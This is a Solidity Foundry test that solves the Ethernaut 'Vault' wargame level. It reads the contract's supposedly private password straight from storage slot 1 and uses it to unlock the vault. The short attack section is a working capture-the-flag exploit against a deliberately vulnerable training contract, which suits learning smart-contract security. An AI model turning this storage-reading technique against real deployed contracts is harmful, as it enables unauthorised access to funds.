pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Vault/VaultFactory.sol";
import "../src/core//Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;

    using stdStorage for StdStorage;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes32 password = vm.load(address(ethernautVault), bytes32(uint256(1)));

        ethernautVault.unlock(password);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}